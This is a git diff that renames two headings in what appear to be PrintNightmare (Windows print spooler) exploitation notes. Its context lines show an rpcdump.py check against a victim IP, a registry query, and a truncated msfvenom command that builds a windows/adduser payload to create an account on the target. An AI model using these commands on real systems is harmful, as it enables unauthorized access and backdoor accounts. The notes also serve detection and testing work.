@@ -1,4 +1,4 @@
-# Remote Detection
+# Vulnerability Detection (Remote)
 When running:
 ```bash
 rpcdump.py @<VICTIM_IP> | egrep 'MS-RPRN|MS-PAR'
@@ -61,7 +61,7 @@ msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD_MATCHING_COPLEXITY> -
 
 ---
 
-# Local Detection
+# Vulnerability Detection (Local)
 When runnnig:
 ```shell
 REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
